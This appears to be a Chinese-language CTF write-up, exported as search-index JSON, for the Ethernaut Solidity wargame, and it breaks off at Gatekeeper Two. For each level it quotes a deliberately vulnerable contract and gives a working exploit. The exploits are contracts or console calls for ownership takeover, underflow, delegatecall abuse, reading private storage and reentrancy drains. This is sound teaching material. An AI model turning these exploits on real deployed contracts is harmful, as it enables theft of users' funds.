<li>\u901a\u8fc7 https://faucet.rinkeby.io/ \u6216\u8005 https://faucets.chain.link/rinkeby \u641e\u70b9\u6d4b\u8bd5\u5e01\uff08\u4e3b\u8981\u7528\u6765\u540e\u7eed\u652f\u4ed8 gas\uff09</li> <li>\u5728 ethernaut \u4e0a\u8fde\u63a5 MetaMask</li> <li>\u6bcf\u4e00\u9053\u9898\u76ee\u5148\u751f\u6210\u65b0\u5b9e\u4f8b\uff0c\u5728 console \u4e2d\u5b8c\u6210\u540e\u63d0\u4ea4\u5b9e\u4f8b</li> </ul>"},{"location":"writeups/ethernaut/#hello-ethernaut","title":"Hello Ethernaut","text":"<p>\u6309\u7167\u9898\u76ee\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\u8c03\u7528\u51fd\u6570\u5373\u53ef</p>"},{"location":"writeups/ethernaut/#fallback","title":"Fallback","text":"<p>\u7ed9\u4e86\u5408\u7ea6\u6e90\u7801</p> \u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallback {\n\n    using SafeMath for uint256;\n    mapping(address =&gt; uint) public contributions;\n    address payable public owner;\n\n    constructor() public {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value &lt; 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if(contributions[msg.sender] &gt; contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        owner.transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);\n        owner = msg.sender;\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u62ff\u5230\u8fd9\u4e2a\u5408\u7ea6\u7684\u63a7\u5236\u6743\uff0c\u8f6c\u51fa\u6240\u6709\u4f59\u989d</p> <p>\u4e3b\u8981\u903b\u8f91\u662f contribute \u51fd\u6570\u4f1a\u589e\u52a0\u8c03\u7528\u8005\u7684 contributions\uff0c\u5f53\u5927\u4e8e 1000 ether \u7684\u65f6\u5019\uff0c\u4f1a\u628a\u6240\u6709\u6743\u8f6c\u7ed9\u73a9\u5bb6\u3002\u901a\u8fc7\u8fd9\u4e2a\u6765\u83b7\u5f97\u63a7\u5236\u6743\u662f\u4e0d\u73b0\u5b9e\u7684</p> <p>\u800c\u53e6\u4e00\u4e2a\u4f1a\u53d1\u751f\u6240\u6709\u6743\u8f6c\u6362\u7684\u51fd\u6570\u662f receive \u51fd\u6570\uff0c\u8fd9\u662f\u4e00\u4e2a fallback \u51fd\u6570\uff0c\u4f1a\u5728\u5408\u7ea6\u8d26\u6237\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u65f6\u5019\u89e6\u53d1\uff0c\u6240\u4ee5\u5728\u8fd9\u91cc\u53ea\u8981\u5411\u5408\u7ea6\u53d1\u51fa\u5e26\u6709\u4ee5\u592a\u5e01\u7684\u4ea4\u6613\u5c31\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\u8f6c\u79fb\u6240\u6709\u6743</p> <p>\u800c\u4e4b\u524d\u8fd8\u9700\u8981\u5148\u4fdd\u8bc1 contributions \u5927\u4e8e 0\uff0c\u6240\u4ee5\u89e3\u6cd5\uff1a <pre><code>&gt; contract.contribute({value: 1})      // \u4f7f contributions \u5927\u4e8e 0 \n&gt; contract.sendTransaction({value: 1}) // \u89e6\u53d1 fallback \u8f6c\u79fb\u6240\u6709\u6743\n&gt; contract.withdraw()                  // \u8f6c\u51fa\u6240\u6709\u4f59\u989d\n</code></pre></p>"},{"location":"writeups/ethernaut/#fallout","title":"Fallout","text":"<p>\u8981\u6c42\u5f97\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743</p> <p>\u6839\u636e\u5408\u7ea6\u6e90\u7801\u53ef\u4ee5\u53d1\u73b0\u5b83\u7684 constructor \u7684\u51fd\u6570\u540d\u4e3a Fal1out\uff0c\u5e76\u4e0d\u662f\u5408\u7ea6\u540d Fallout\uff0c\u6709 l1 \u7684\u5dee\u522b</p> <p>\u6240\u4ee5\u76f4\u63a5\u8c03\u7528 contract.Fal1out() \u5c31\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u5408\u7ea6\u6240\u6709\u6743</p>"},{"location":"writeups/ethernaut/#coin-flip","title":"Coin Flip","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract CoinFlip {\n\n    using SafeMath for uint256;\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() public {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue.div(FACTOR);\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n</code></pre> <p>\u8981\u6c42\u8fde\u7eed\u731c\u5bf9\u5341\u6b21\uff0c\u5408\u7ea6\u4e2d\u7ed9\u51fa\u4e86\u5b83\u53d6\u968f\u673a\u6570\u7684\u65b9\u5f0f\uff0c\u5373\u5c06 block.number \u51cf\u4e00\uff0c\u53d6\u54c8\u5e0c\u503c\uff0c\u7136\u540e\u518d\u9664\u4ee5 FACTOR \u5224\u65ad\u662f\u5426\u4e3a 1</p> <p>\u6240\u4ee5\u5199\u4e00\u4e2a\u65b0\u5408\u7ea6\u6765\u83b7\u53d6\u540c\u6837\u7684 block.number \u5c31\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7b54\u6848</p> <p>\u56e0\u4e3a\u5224\u65ad\u4e86 lashHash == blockValue \u7684\u65f6\u5019 revert\uff0c\u6240\u4ee5\u9700\u8981\u7b49\u4e00\u6bb5\u65f6\u95f4\uff0c\u9010\u6b21\u731c\u6d4b\uff0c\u8fde\u7eed\u731c 10 \u6b21 </p> exp <pre><code>// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.6.0;\n\n/* code of CoinFlip */\n\ncontract Exploit {\n    using SafeMath for uint256;\n    CoinFlip p;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    constructor(address challenge) public {\n        p = CoinFlip(challenge);\n    }\n    function exp() public {\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n        uint256 coinFlip = blockValue.div(FACTOR);\n        bool side = coinFlip == 1 ? true : false;\n        p.flip(side);\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#telephone","title":"Telephone","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Telephone {\n    address public owner;\n    constructor() public {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n</code></pre> <p>\u4e5f\u662f\u9700\u8981\u62ff\u5230\u5408\u7ea6\u7684\u6240\u6709\u6743\uff0c\u800c\u8c03\u7528\u5408\u7ea6\u4e2d\u7684 changeOwner \u51fd\u6570\u6765\u8f6c\u79fb\u6240\u6709\u6743\u7684\u8bdd\uff0c\u9700\u8981\u4f7f tx.origin \u548c msg.sender \u4e0d\u540c</p> <p>\u5b83\u4eec\u7684\u533a\u522b\uff1a</p> <ul> <li>tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740</li> <li>msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740</li> </ul> <p>\u6240\u4ee5\u5982\u679c\u901a\u8fc7 \u8d26\u6237 A -&gt; \u5408\u7ea6 A -&gt; \u5408\u7ea6 B \u6765\u8c03\u7528\u7684\u8bdd\uff0ctx.origin \u5c31\u662f\u8d26\u6237 A\uff0c\u800c\u5bf9\u4e8e\u5408\u7ea6 B \u6765\u8bf4\uff0cmsg.sender \u662f\u5408\u7ea6 A</p> <p>\u6240\u4ee5\u8fd9\u9898\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u6765\u8c03\u7528\u9898\u76ee\u7684 changeOwner \u51fd\u6570\u5c31\u597d\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Telephone */\n\ncontract Exploit {\n    Telephone p = Telephone(&lt;instance address&gt;);\n    function exp() public {\n        p.changeOwner(msg.sender);\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#token","title":"Token","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n    mapping(address =&gt; uint) balances;\n    uint public totalSupply;\n\n    constructor(uint _initialSupply) public {\n        balances[msg.sender] = totalSupply = _initialSupply;\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        require(balances[msg.sender] - _value &gt;= 0);\n        balances[msg.sender] -= _value;\n        balances[_to] += _value;\n        return true;\n    }\n\n    function balanceOf(address _owner) public view returns (uint balance) {\n        return balances[_owner];\n    }\n}\n</code></pre> <p>\u5f00\u5c40\u81ea\u5df1\u7684 balance \u662f 20\uff0c\u76ee\u7684\u662f\u589e\u52a0\u81ea\u5df1\u7684 balance</p> <p>\u53ef\u4ee5\u53d1\u73b0 transfer \u4e2d\u662f\u76f4\u63a5\u5c06 sender \u7684 balance \u51cf\u8f6c\u8d26\u7684 value\uff0c\u800c\u5982\u679c value \u8d85\u8fc7 balance \u5219\u4f1a\u53d1\u751f\u6ea2\u51fa\uff0c\u56e0\u4e3a\u662f uint\uff0c\u5219\u4f1a\u53d8\u4e3a\u5f88\u5927\u7684\u503c</p> <p>\u6240\u4ee5\u901a\u8fc7 <code>await contract.transfer(&lt;any address&gt;, 21)</code> \u5373\u53ef\u4f7f\u81ea\u5df1\u7684 balance \u6ea2\u51fa\u53d8\u5927</p>"},{"location":"writeups/ethernaut/#delegation","title":"Delegation","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Delegate {\n    address public owner;\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract Delegation {\n    address public owner;\n    Delegate delegate;\n    constructor(address _delegateAddress) public {\n        delegate = Delegate(_delegateAddress);\n        owner = msg.sender;\n    }\n    fallback() external {\n        (bool result,) = address(delegate).delegatecall(msg.data);\n        if (result) {\n            this;\n        }\n    }\n}\n</code></pre> <p>\u76ee\u7684\u8fd8\u662f\u62ff\u5230\u6240\u6709\u6743\uff0c\u5373\u6267\u884c Delegate \u4e2d\u7684 pwn \u51fd\u6570</p> <p>\u53ef\u4ee5\u901a\u8fc7\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u7136\u540e\u8c03\u7528 delegatecall \u6765\u901a\u8fc7 msg.data \u8c03\u7528 pwn \u51fd\u6570</p> <p>data \u4e2d\u524d\u56db\u4e2a\u5b57\u8282\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u524d\u9762\u7684 sha3 \u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\uff0c\u540e\u9762\u5982\u679c\u6ca1\u6709\u4f20\u5165\u6570\u636e\u53ef\u4ee5\u7701\u7565</p> <p>\u6240\u4ee5\u8ba1\u7b97\u51fa pwn() \u7684 sha3 \u7136\u540e\u4f5c\u4e3a data \u4f20\u7ed9 fallback \u5373\u53ef</p> <pre><code>&gt; web3.utils.sha3(\"pwn()\")\n'0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'\n&gt; contract.sendTransaction({data: \"0xdd365b8b\"})\n</code></pre>"},{"location":"writeups/ethernaut/#force","title":"Force","text":"<p>\u9898\u76ee\u662f\u4e00\u4e2a\u7a7a\u7684\u5408\u7ea6\uff0c\u8981\u6c42\u5411\u5176\u4e2d\u8f6c\u8d26</p> <p>\u800c\u4e00\u4e2a\u5408\u7ea6\u5728\u81ea\u6bc1\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5c06\u4f59\u989d\u5168\u90e8\u5f3a\u5236\u8f6c\u5230\u53e6\u4e00\u4e2a\u5730\u5740\u4e0a\uff0c\u6240\u4ee5\u65b0\u5efa\u4e00\u4e2a\u5408\u7ea6\u7136\u540e\u81ea\u6bc1\uff0c\u628a\u4f59\u989d\u8f6c\u5230\u5b9e\u4f8b\u5730\u5740\u4e0a\u5c31\u53ef\u4ee5\u4e86</p> <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    constructor() public payable {}  // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6\n    function exp(address challenge) public {\n        // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable\n        address payable challenge = payable(address(challenge));\n        selfdestruct(challenge);\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#vault","title":"Vault","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Vault {\n    bool public locked;\n    bytes32 private password;\n\n    constructor(bytes32 _password) public {\n        locked = true;\n        password = _password;\n    }\n\n    function unlock(bytes32 _password) public {\n        if (password == _password) {\n            locked = false;\n        }\n    }\n}\n</code></pre> <p>\u8981 unlock \u8fd9\u4e2a\u5408\u7ea6\u8d26\u6237\uff0c\u4e5f\u5c31\u662f\u8981\u627e\u5230 password</p> <p>\u867d\u7136 password \u88ab\u8bbe\u4e3a\u4e86 private\uff0c\u4f46\u662f\u5728\u533a\u5757\u4e2d\u7684\u6570\u636e\u4ecd\u7136\u662f\u53ef\u89c1\u7684\uff0c\u6240\u4ee5\u53ea\u8981 getStorageAt \u5c31\u53ef\u4ee5\u4e86\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, 1) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password\n'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'\n&gt; web3.utils.toAscii(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\")\n'A very strong secret password :)'\n&gt; await contract.unlock(\"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\")\n// \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb\n</code></pre></p>"},{"location":"writeups/ethernaut/#king","title":"King","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract King {\n    address payable king;\n    uint public prize;\n    address payable public owner;\n\n    constructor() public payable {\n        owner = msg.sender;  \n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    receive() external payable {\n        require(msg.value &gt;= prize || msg.sender == owner);\n        king.transfer(msg.value);\n        king = msg.sender;\n        prize = msg.value;\n    }\n\n    function _king() public view returns (address payable) {\n        return king;\n    }\n}\n</code></pre> <p>\u5f53\u9898\u76ee\u518d\u6b21\u51fa\u8d44\u66f4\u9ad8\u7684\u65f6\u5019\uff0cking \u5c31\u4f1a\u56de\u5230\u9898\u76ee\u4e0a\uff0c\u8981\u4fdd\u6301 king \u5728\u81ea\u5df1\u8eab\u4e0a</p> <p>\u800c\u6bcf\u6b21\u66f4\u6362 king \u7684\u65f6\u5019\u90fd\u4f1a\u5148\u628a\u91d1\u989d transfer \u7ed9\u4e0a\u4e00\u4e2a king\uff0c\u6240\u4ee5\u53ea\u8981\u4e0d\u63a5\u6536\u5c31\u597d\u4e86</p> <p>\u53ef\u4ee5\u4f7f\u7528 fallback\uff0c\u7136\u540e\u51fd\u6570\u91cc\u9762\u76f4\u63a5 revert</p> <p><pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    constructor(address challenge) public payable {\n        challenge.call.gas(10000000).value(msg.value)(\"\");\n    }\n    fallback() external {\n        revert();\n    }\n}\n</code></pre> \u6ce8\u610f\u9700\u8981\u652f\u4ed8\u5927\u4e8e 1 ether \u624d\u53ef\u4ee5\u5148\u62ff\u5230 king </p>"},{"location":"writeups/ethernaut/#re-entrancy","title":"Re-entrancy","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Reentrance {\n\n    using SafeMath for uint256;\n    mapping(address =&gt; uint) public balances;\n\n    function donate(address _to) public payable {\n        balances[_to] = balances[_to].add(msg.value);\n    }\n\n    function balanceOf(address _who) public view returns (uint balance) {\n        return balances[_who];\n    }\n\n    function withdraw(uint _amount) public {\n        if(balances[msg.sender] &gt;= _amount) {\n            (bool result,) = msg.sender.call{value:_amount}(\"\");\n            if(result) {\n                _amount;\n            }\n            balances[msg.sender] -= _amount;\n        }\n    }\n\n    receive() external payable {}\n}\n</code></pre> <p>\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f <code>msg.sender.call{value:_amount}(\"\")</code>\uff0c\u5e76\u4e14\u5728\u8fd9\u4e4b\u540e\u624d\u51cf\u5c11 balances</p> <p>\u800c\u8fd9\u4e2a call \u4f1a\u6389\u5230 fallback \u4e2d\uff0c\u5982\u679c fallback \u91cc\u518d\u6b21\u8c03\u7528\u4e86 withdraw \u5c31\u5b9e\u73b0\u4e86\u91cd\u5165\u653b\u51fb\uff0c\u4e0d\u65ad\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u7684\u4f59\u989d\u76f4\u5230\u4e3a 0</p> <p>\u5148\u901a\u8fc7 <code>await getBalance(instance)</code> \u5f97\u5230\u76ee\u6807\u5408\u7ea6\u4e2d\u7684 balance \u4e3a 0.001 ether\uff0c\u6240\u4ee5\u6bcf\u6b21 withdraw 0.001 ether \u5c31\u597d</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Reentrance */\n\ncontract Exploit {\n    Reentrance challenge;\n    constructor(address payable addr) public payable {\n        challenge = Reentrance(addr);\n    }\n    function exp() public {\n        challenge.withdraw(0.001 ether);\n    }\n    fallback() external payable {\n        if (address(challenge).balance &gt;= 0) {\n            challenge.withdraw(0.001 ether);\n        }\n    }\n}\n</code></pre> <p>\u9996\u5148\u76f4\u63a5\u90e8\u7f72\u5408\u7ea6\uff0c\u7136\u540e <code>contract.donate.sendTransaction(&lt;exp contract addr&gt;, {value: toWei(\"0.001\")})</code> \u5148 donate 0.001 ether\uff0c\u7136\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\u653b\u51fb\u63d0\u53d6\u51fa\u76ee\u6807\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u4f59\u989d</p>"},{"location":"writeups/ethernaut/#elevator","title":"Elevator","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ninterface Building {\n    function isLastFloor(uint) external returns (bool);\n}\n\n\ncontract Elevator {\n    bool public top;\n    uint public floor;\n\n    function goTo(uint _floor) public {\n        Building building = Building(msg.sender);\n\n        if (! building.isLastFloor(_floor)) {\n            floor = _floor;\n            top = building.isLastFloor(floor);\n        }\n    }\n}\n</code></pre> <p>\u76ee\u7684\u662f\u4f7f\u7535\u68af\u8fbe\u5230\u6700\u9876\u5c42\uff0c\u5373\u4f7f\u9898\u76ee\u5408\u7ea6\u7684 top \u4e3a true</p> <p>\u56e0\u4e3a top \u7684\u53d8\u5316\u53ea\u4f1a\u5728 goTo \u91cc\u53d1\u751f\u53d8\u5316\uff0c\u5e76\u4e14\u53ea\u6709\u5728 isLastFloor \u4e3a false \u7684\u65f6\u5019\u624d\u4f1a\u6539 top\uff0c\u800c\u4e14\u4e24\u6b21\u8c03\u7528 isLastFloor \u7684\u8f93\u5165\u4e00\u6837</p> <p>\u6240\u4ee5\u53ea\u9700\u8981\u8ba9\u7b2c\u4e00\u6b21\u8c03\u7528 isLastFloor \u8fd4\u56de false\uff0c\u7b2c\u4e8c\u6b21\u8fd4\u56de true \u5c31\u53ef\u4ee5\u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n/* code of Elevator */\n\ncontract Exploit {\n    Elevator elevator;\n    bool top = true;\n    constructor(address challenge) public {\n        elevator = Elevator(challenge);\n    }\n    function isLastFloor(uint) public returns (bool) {\n        top = !top;  // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c\n        return top;\n    }\n    function exp() public {\n        elevator.goTo(1);\n    }\n}\n</code></pre> <p>\u8fd9\u6837\u5728\u90e8\u7f72\u4e4b\u540e\u8c03\u7528 exp \u51fd\u6570\u5c31\u53ef\u4ee5\u8ba9 top \u4e3a true</p>"},{"location":"writeups/ethernaut/#privacy","title":"Privacy","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Privacy {\n\n    bool public locked = true;\n    uint256 public ID = block.timestamp;\n    uint8 private flattening = 10;\n    uint8 private denomination = 255;\n    uint16 private awkwardness = uint16(now);\n    bytes32[3] private data;\n\n    constructor(bytes32[3] memory _data) public {\n        data = _data;\n    }\n\n    function unlock(bytes16 _key) public {\n        require(_key == bytes16(data[2]));\n        locked = false;\n    }\n}\n</code></pre> <p>\u548c Vault \u90a3\u9898\u5f88\u76f8\u4f3c\uff0c\u90fd\u662f\u8981\u8bfb\u53d6 private \u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 unlock</p> <p>\u540c\u6837\u6765\u7528 <code>web3.eth.getStorageAt</code> \u6765 dump \u51fa storage\uff1a <pre><code>&gt; await web3.eth.getStorageAt(instance, 0)\n'0x0000000000000000000000000000000000000000000000000000000000000001'\n&gt; await web3.eth.getStorageAt(instance, 1)\n'0x00000000000000000000000000000000000000000000000000000000623b0e73'\n&gt; await web3.eth.getStorageAt(instance, 2)\n'0x000000000000000000000000000000000000000000000000000000000e73ff0a'\n&gt; await web3.eth.getStorageAt(instance, 3)\n'0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569'\n&gt; await web3.eth.getStorageAt(instance, 4)\n'0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364'\n&gt; await web3.eth.getStorageAt(instance, 5)\n'0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf'\n&gt; await web3.eth.getStorageAt(instance, 6)\n'0x0000000000000000000000000000000000000000000000000000000000000000'\n</code></pre></p> <p>\u4e0d\u96be\u770b\u51fa 0 \u5904\u5b58\u50a8\u7684\u662f bool locked\uff0c1 \u5904\u662f\u4e00\u4e2a 256 \u4f4d ID\uff0c2 \u5904\u662f\u5269\u4e0b\u7684\u4e24\u4e2a uint8\u3001\u4e00\u4e2a uint16 \u62fc\u51fa\u6765\u7684\uff0c\u800c 3\uff5e5 \u5c31\u662f data \u4e86</p> <p>\u6240\u4ee5 data[2] \u4e5f\u5c31\u662f <code>0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf</code></p> <p>\u800c unlock \u9700\u8981 bytes16\uff0c\u800c\u4e14\u5728\u5185\u90e8\u5c06 data[2] \u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86 bytes16\uff0c\u8fd9\u4f1a\u53d6\u524d 16 \u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u8c03\u7528 unlock: <pre><code>contract.unlock(\"0x6710884543189de73f0dfb9d36a99f2a\")\n</code></pre></p>"},{"location":"writeups/ethernaut/#gatekeeper-one","title":"Gatekeeper One","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract GatekeeperOne {\n    using SafeMath for uint256;\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        require(gasleft().mod(8191) == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n        require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n        require(uint32(uint64(_gateKey)) == uint16(tx.origin), \"GatekeeperOne: invalid gateThree part three\");\n        _;\n    }\n\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n        entrant = tx.origin;\n        return true;\n    }\n}\n</code></pre> <p>\u76ee\u6807\u662f\u901a\u8fc7\u4e09\u4e2a modifier \u7684\u68c0\u6d4b\uff0c\u5373\u6709\u4e09\u4e2a\u8981\u6c42</p> <ul> <li>msg.sender != tx.origin\uff1a\u5373\u901a\u8fc7\u4e00\u4e2a\u5408\u7ea6\u6765\u95f4\u63a5\u8c03\u7528 enter</li> <li>gasleft() % 8191 == 0\uff1a\u8fd0\u884c\u5230\u8fd9\u4e00\u6b65\u65f6\u5269\u4f59\u7684 gas \u8981\u662f 8191 \u7684\u500d\u6570</li> <li>\u8f93\u5165\u7684 _gateKey \u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6</li> </ul> <p>\u7b2c\u4e00\u4e2a\u597d\u529e\uff0c\u76f4\u63a5\u5199\u4e00\u4e2a\u5408\u7ea6\u5c31\u597d</p> <p>\u7b2c\u4e8c\u4e2a\u56e0\u4e3a\u8fc7\u7a0b\u4e2d\u4f1a\u6d88\u8017\u591a\u5c11 gas \u4e0d\u660e\u786e\uff0c\u6240\u4ee5\u8981\u5148\u5199\u4e00\u4e2a\u8bd5\u8bd5\u6765 debug\uff0c\u770b\u770b\u4e2d\u9014\u6d88\u8017\u4e86\u591a\u5c11 gas\uff1a <pre><code>contract Exploit {\n    GatekeeperOne challenge;\n    constructor(address addr) public {\n        challenge = GatekeeperOne(addr);\n    }\n    function exp() public {\n        challenge.enter.gas(81910)(bytes8(\"0x123456\"));\n    }\n}\n</code></pre> \u5148\u968f\u610f\u8bbe\u7f6e gas \u4e3a 81910\uff0c\u7136\u540e\u90e8\u7f72\u5408\u7ea6\u3001\u8c03\u7528\uff0cdebug\uff08\u9700\u8981\u8c03\u5230 JavaScript VM \u4e0a\uff0c\u4f7f\u7528 Inject \u7684 Rinkeby \u7f51\u7edc\u597d\u50cf\u6ca1\u6cd5\u8c03\u8bd5\uff09</p> <p>\u5355\u6b65\u8fd0\u884c\uff0c\u76f4\u5230\u6d41\u7a0b\u8fdb\u5165\u5230 gateTwo \u51fd\u6570\u4e2d\u7684 GAS \u6307\u4ee4\uff08\u5c06\u5269\u4f59\u7684 gas \u538b\u5165\u6808\u4e2d\uff09\uff0c\u6b64\u65f6\u663e\u793a\u5f53\u524d\u6b65 gas \u4e3a 2\uff0c\u5269\u4f59 gas \u4e3a 81658</p> <p>\u6240\u4ee5\u8f93\u5165\u7684 gas \u4e3a 81910 + (81910 - 81658) + 2 = 82164 \u65f6\uff0c\u538b\u5165\u6808\u4e2d\u7684 gas \u521a\u597d\u662f 81910</p> <p>\u5bf9\u4e8e\u7b2c\u4e09\u4e2a\uff0cbytes8 \u76f8\u5f53\u4e8e uint64\uff0c\u800c\u4e14\u4f7f\u7528 uintx \u6765\u5f3a\u5236\u8f6c\u6362\u65f6\u4ece\u540e\u5f80\u524d\u53d6\uff0c\u6240\u4ee5\u9700\u8981\u6ee1\u8db3\uff1a</p> <ul> <li>16~31 \u4f4d\uff08\u540e 3\u30014 \u5b57\u8282\uff09\u4e3a 0</li> <li>32 \u4f4d\u53ca\u4ee5\u4e0a\u4e0d\u5168\u4e3a 0</li> <li>0~15 \u4f4d\uff08\u540e\u4e24\u4e2a\u5b57\u8282\uff09\u548c\u81ea\u5df1\u5730\u5740\u7684\u540e\u4e24\u4e2a\u5b57\u8282\u76f8\u540c</li> </ul> <p>\u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u51fa\u9700\u8981\u7684 bytes8 \u4e3a <code>bytes8(0x0000000100000E28)</code>\uff0c\u628a\u8fd9\u4e2a\u8f93\u5165\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u4e2a gate \u4e86</p> exp <pre><code>// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Exploit {\n    GatekeeperOne challenge;\n    constructor(address addr) public {\n        challenge = GatekeeperOne(addr);\n    }\n    function exp() public {\n        challenge.enter.gas(82164)(bytes8(0x0000000100000E28));\n    }\n}\n</code></pre>"},{"location":"writeups/ethernaut/#gatekeeper-two","title":"Gatekeeper Two","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>// 